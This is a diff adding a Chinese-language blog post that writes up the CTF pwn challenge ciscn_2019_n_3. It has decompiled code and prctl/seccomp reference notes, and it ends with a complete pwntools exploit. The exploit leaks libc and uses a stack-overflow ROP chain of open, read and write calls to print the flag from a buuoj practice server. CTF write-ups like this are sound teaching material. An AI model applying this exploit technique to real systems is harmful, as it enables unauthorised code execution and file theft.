@@ -1,0 +1,441 @@
+---
+layout: post
+title:  ciscn_2019_n_3
+date:   2021-02-28 00:01:01 +0300
+image:  2021-02-28-skyscrapers.jpg
+tags:   [ctf,Pwn,V&N2020公开赛]
+---
+
+#### checksec
+
+```assembly
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+#### main()
+
+```assembly
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  sub_80A();
+  puts("This is a easy challange for you.");
+  printf("Here is my gift: 0x%llx\n", &puts);
+  sub_84D();
+  sub_9D3();
+  return 0LL;
+}
+```
+
+#### sub_84D()
+
+```assembly
+int sub_84D()
+{
+  __int16 v1; // [rsp+0h] [rbp-70h]
+  __int16 *v2; // [rsp+8h] [rbp-68h]
+  __int16 v3; // [rsp+10h] [rbp-60h]
+  char v4; // [rsp+12h] [rbp-5Eh]
+  char v5; // [rsp+13h] [rbp-5Dh]
+  int v6; // [rsp+14h] [rbp-5Ch]
+  __int16 v7; // [rsp+18h] [rbp-58h]
+  char v8; // [rsp+1Ah] [rbp-56h]
+  char v9; // [rsp+1Bh] [rbp-55h]
+  int v10; // [rsp+1Ch] [rbp-54h]
+  char v11; // [rsp+22h] [rbp-4Eh]
+  char v12; // [rsp+23h] [rbp-4Dh]
+  int v13; // [rsp+24h] [rbp-4Ch]
+  __int16 v14; // [rsp+28h] [rbp-48h]
+  char v15; // [rsp+2Ah] [rbp-46h]
+  char v16; // [rsp+2Bh] [rbp-45h]
+  int v17; // [rsp+2Ch] [rbp-44h]
+  __int16 v18; // [rsp+30h] [rbp-40h]
+  char v19; // [rsp+32h] [rbp-3Eh]
+  char v20; // [rsp+33h] [rbp-3Dh]
+  int v21; // [rsp+34h] [rbp-3Ch]
+  __int16 v22; // [rsp+38h] [rbp-38h]
+  char v23; // [rsp+3Ah] [rbp-36h]
+  char v24; // [rsp+3Bh] [rbp-35h]
+  int v25; // [rsp+3Ch] [rbp-34h]
+  __int16 v26; // [rsp+40h] [rbp-30h]
+  char v27; // [rsp+42h] [rbp-2Eh]
+  char v28; // [rsp+43h] [rbp-2Dh]
+  int v29; // [rsp+44h] [rbp-2Ch]
+  __int16 v30; // [rsp+48h] [rbp-28h]
+  char v31; // [rsp+4Ah] [rbp-26h]
+  char v32; // [rsp+4Bh] [rbp-25h]
+  int v33; // [rsp+4Ch] [rbp-24h]
+  __int16 v34; // [rsp+50h] [rbp-20h]
+  char v35; // [rsp+52h] [rbp-1Eh]
+  char v36; // [rsp+53h] [rbp-1Dh]
+  int v37; // [rsp+54h] [rbp-1Ch]
+  __int16 v38; // [rsp+58h] [rbp-18h]
+  char v39; // [rsp+5Ah] [rbp-16h]
+  char v40; // [rsp+5Bh] [rbp-15h]
+  int v41; // [rsp+5Ch] [rbp-14h]
+  __int16 v42; // [rsp+60h] [rbp-10h]
+  char v43; // [rsp+62h] [rbp-Eh]
+  char v44; // [rsp+63h] [rbp-Dh]
+  int v45; // [rsp+64h] [rbp-Ch]
+  char v46; // [rsp+6Ah] [rbp-6h]
+  char v47; // [rsp+6Bh] [rbp-5h]
+  int v48; // [rsp+6Ch] [rbp-4h]
+
+  prctl(38, 1LL, 0LL, 0LL, 0LL);
+  v3 = 32;
+  v4 = 0;
+  v5 = 0;
+  v6 = 4;
+  v7 = 21;
+  v8 = 0;
+  v9 = 9;
+  v10 = -1073741762;
+  v11 = 0;
+  v12 = 0;
+  v13 = 0;
+  v14 = 53;
+  v15 = 7;
+  v16 = 0;
+  v17 = 0x40000000;
+  v18 = 21;
+  v19 = 6;
+  v20 = 0;
+  v21 = 59;
+  v22 = 21;
+  v23 = 0;
+  v24 = 4;
+  v25 = 1;
+  v26 = 32;
+  v27 = 0;
+  v28 = 0;
+  v29 = 36;
+  v30 = 21;
+  v31 = 0;
+  v32 = 2;
+  v33 = 0;
+  v34 = 32;
+  v35 = 0;
+  v36 = 0;
+  v37 = 32;
+  v38 = 21;
+  v39 = 1;
+  v40 = 0;
+  v41 = 16;
+  v42 = 6;
+  v43 = 0;
+  v44 = 0;
+  v45 = 2147418112;
+  v46 = 0;
+  v47 = 0;
+  v48 = 0;
+  v1 = 12;
+  v2 = &v3;
+  return prctl(
+           22,
+           2LL,
+           &v1,
+           *(_QWORD *)&v1,
+           &v3,
+           *(_QWORD *)&v3,
+           *(_QWORD *)&v7,
+           32LL,
+           *(_QWORD *)&v14,
+           *(_QWORD *)&v18,
+           *(_QWORD *)&v22,
+           *(_QWORD *)&v26,
+           *(unsigned int *)&v30,
+           *(_QWORD *)&v34,
+           *(_QWORD *)&v38,
+           *(_QWORD *)&v42,
+           6LL);
+}
+```
+
+prctl()函数
+
+```assembly
+#include <sys/prctl.h>
+ 
+int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
+```
+
+这个系统调用指令是为进程制定而设计的，明确的选择取决于option:
+
+PR_GET_PDEATHSIG :返回处理器信号；
+
+PR_SET_PDEATHSIG :arg2作为处理器信号pdeath被输入，正如其名，如果父进程不能再用，进程接受这个信号。
+
+PR_GET_DUMPABLE :返回处理器标志dumpable;
+
+PR_SET_DUMPABLE :arg2作为处理器标志dumpable被输入。
+
+PR_GET_NAME :返回调用进程的进程名字给参数arg2; （Since Linux2.6.9）
+
+PR_SET_NAME :把参数arg2作为调用进程的经常名字。（SinceLinux 2.6.11）
+
+PR_GET_TIMING :
+
+PR_SET_TIMING :判定和修改进程计时模式,用于启用传统进程计时模式的
+
+PR_TIMING_STATISTICAL，或用于启用基于时间戳的进程计时模式的
+
+PR_TIMING_TIMESTAMP。
+
+CAP_CHOWN功能：
+
+在一个_POSIX_CHOWN_RESTRICTED功能定义的系统。这会越过改变系统文件所有者和组所有的权限
+
+CAP_DAC_OVERRIED功能：
+
+如果_POSIX_ACL定义，就会越过所有的DAC访问，包括ACL执行访问，用CAP_LINUX_IMMUTABLE功能来排除
+DAC的访问
+
+CAP_DAC_READ_SEARCH功能：
+
+如果_POSIX_ACL定义，就会越过所有的DAC的读限制，
+ 并在所有的文件和目录里搜索，包括ACL限制。用CAP_LINUX_IMMUTABLE来限制DAC访问
+
+CAP_FOWNER功能：
+
+ 越过文件说有的允许限制，如文件的所有者ID必须和用户ID一样，除了CAP_FSETID可用。它不会越过MAC和DAC限制
+
+CAP_FSETID功能：
+
+越过当设置文件的S_ISUID和S_ISGID位的时候，用户的ID必须和所有者ID匹配的限制，设置S-ISGID位的时候，组ID
+必须和所有者ID匹配的限制，用chown来设置S_ISUID和S_ISGID为的功能限制
+
+CAP_FS_MASK功能：
+
+用来回应suser（）或是fsuser（）。
+
+CAP_KILL功能：
+
+一个有有效用户ID的进程发送信号时必须匹配有效用户ID的功能会越过
+
+CAP_SETGID功能：
+
+允许setgid（） 功能， 允许setgroups（）
+允许在socket里伪造gid
+
+CAP_SETUID功能：
+
+允许set*uid（）功能 允许伪造pid在socket
+
+CAP_SETPCAP 功能：
+
+把所有的许可给所有的pid。或是把所有的许可删除
+
+CAP_LINUX_IMMUTABLE功能：
+
+允许更改S_IMMUTABLE和S_APPEND文件属性
+
+CAP_NET_BIND_SERVICE功能：
+
+允许绑定1024下的TCP/UDP套接字
+
+CAP_NET_BROADCAST功能：
+
+允许广播，监听多点传送
+
+CAP_NET_ADMIN功能：
+
+允许配置接口
+允许管理IP防火墙IP伪装和帐户
+允许配置socket调试选项
+允许修改路由表
+允许配置socket上的进程的组属性
+允许绑定所有地址的透明代理
+允许配置TOS（服务类型）
+允许配置混杂模式
+允许清除驱动状态
+允许多点传送
+允许读或写系统记录
+
+CAP_NET_RAW功能：
+
+允许用RAW套接字
+允许用PACKET套接字
+
+CAP_IPC_LOCK功能：
+
+允许琐定共享内存段
+允许mlock和mlockall
+
+CAP_IPC_OWNER功能：
+
+越过IPC所有权检查
+
+CAP_SYS_MODULE功能：
+
+ 插入或删除内核模块
+
+CAP_SYS_RAWIO功能：
+
+允许ioperm/iopl和/dev/prot的访问
+允许/dev/mem和/dev/kmem访问
+允许块设备访问（/dev/[sh]d？？）
+
+CAP_SYS_CHROOT功能：
+
+允许chroot（）
+
+CAP_SYS_PTRACE功能：
+
+允许ptrace（）任何进程
+
+CAP_SYS_PACCT功能：
+
+允许配置进程帐号
+
+CAP_SYS_ADMIN功能：
+
+允许配置安全钥匙
+允许管理随机设备
+允许设备管理
+允许检查和配置磁盘限额
+允许配置内核日志
+允许配置域名
+允许配置主机名
+允许调用bdflush（）命令
+允许mount（）和umount（）命令
+允许配置smb连接
+允许root的ioctls
+允许nfsservctl
+允许VM86_REQUEST_IRQ
+允许在alpha上读写pci配置
+允许在mips上的irix_prctl
+允许刷新所有的m68k缓存
+ 允许删除semaphores
+用CAP_CHOWN去代替"chown"IPC消息队列，标志和共享内存
+允许锁定或是解锁共享内存段
+允许开关swap
+允许在socket伪装pids
+允许设置块设备的缓存刷新
+允许设置软盘驱动器
+允许开关DMA开关
+允许管理md设备
+允许管理ide驱动
+允许访问nvram设备
+允许管理apm_bios，串口或是bttv电视设备
+允许在isdn CAPI的驱动下生成命令
+允许读取pci的非标准配置
+允许DDI调试ioctl
+允许发送qic-117命令
+允许启动或禁止SCSI的控制和发送SCSI命令 允许配置加密口令在回路文件系统上
+
+CAP_SYS_BOOT功能：
+
+允许用reboot（） 命令
+
+CAP_SYS_NICE功能：
+
+允许提高或设置其他进程的优先权
+允许在自己的进程用FISO和实时的安排和配置
+
+CAP_SYS_RESOURCE功能：
+
+越过资源限制，设置资源限制
+越过配额限制
+越过保留的ext2文件系统
+允许大于64hz的实时时钟中断
+越过最大数目的控制终端
+越过最大数目的键
+
+CAP_SYS_TIME功能：
+
+允许处理系统时钟
+允许_stime
+允许设置实时时钟
+
+CAP_SYS_TTY_CONFIG功能：
+
+ 允许配置终端设备
+允许vhangup（）终端
+
+返回值
+
+PR_GET_DUMPABLE 和 PR_GET_KEEPCAPS 成功时返回0或者1。其他的option值都是成功时返回0。
+错误时返回 －1，并设置相应的错误号。
+
+EINVAL————option的值不正确，或者当它是PR_SET_PDEATHSIG时，参数arg2的值不是0或者信号数字。
+
+EBADF————无效的描述符
+
+沙盒，禁止了execve和fork syscall，所以不能打开子进程。
+
+常用工具：seccomp-tools
+
+#### sub_9D3()
+
+```assembly
+int sub_9D3()
+{
+  char buf; // [rsp+0h] [rbp-180h]
+
+  printf("Input something: ");
+  read(0, &buf, 0x180uLL);
+  sub_9A1();
+  return puts("Done!");
+}
+```
+
+#### sub_9A1()
+
+```assembly
+ssize_t sub_9A1()
+{
+  char buf; // [rsp+0h] [rbp-70h]
+
+  printf("What's your name?");
+  return read(0, &buf, 0x80uLL);
+}
+```
+
+buf离栈底0x70，也就是我们正好只能覆盖完返回地址不能再多了，覆盖完返回地址，下个8字节就是我们上次输入的东西，所以两次输入可以连起来，作为一个ROP链。
+
+#### exp：
+
+```assembly
+# -*-coding:utf-8-*-
+from pwn import *
+
+io = remote("node3.buuoj.cn", 28082)
+
+io.recvuntil("Here is my gift: 0x")
+
+puts_addr = int(io.recv(12), 16)
+print(hex(puts_addr))
+
+libc = ELF("./libc-2.23.so")
+base = puts_addr - libc.symbols["puts"]
+
+pop_rdi_ret = base + 0x21102
+pop_rsi_ret = base + 0x202e8
+pop_rdx_ret = base + 0x1b92
+
+open_addr = base + libc.symbols['open']
+#free_hook = libcbase_addr+libc.symbols['__free_hook']
+libc_bss = base + 0x3c5720
+read_addr = base + libc.symbols['read']
+#puts_addr = libcbase_addr+libc.symbols['puts']
+write_addr = base + libc.symbols['write']
+
+#   写入read函数的调用，之后我们传入‘flag’这4个字符，作为下面open，read，write的文件名
+payload =  p64(0) + p64(pop_rsi_ret) + p64(libc_bss) + p64(pop_rdx_ret) + p64(0x100) + p64(read_addr)
+#	写入open函数的调用，打开名为‘flag’的文件
+payload += p64(pop_rdi_ret) + p64(libc_bss) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)
+#	写入read函数的调用，读出‘flag’文件里的内容
+payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(libc_bss) + p64(pop_rdx_ret) + p64(0x100) + p64(read_addr)
+#	写入write函数的调用，打印出‘flag’文件里的内容
+payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(libc_bss) + p64(pop_rdx_ret) + p64(0x100) + p64(write_addr)
+
+io.sendafter("Input something: ", payload)
+io.sendafter("What's your name?",'a'* (0x70 + 8) + p64(pop_rdi_ret))
+io.send("flag")
+
+io.interactive()
+```
+
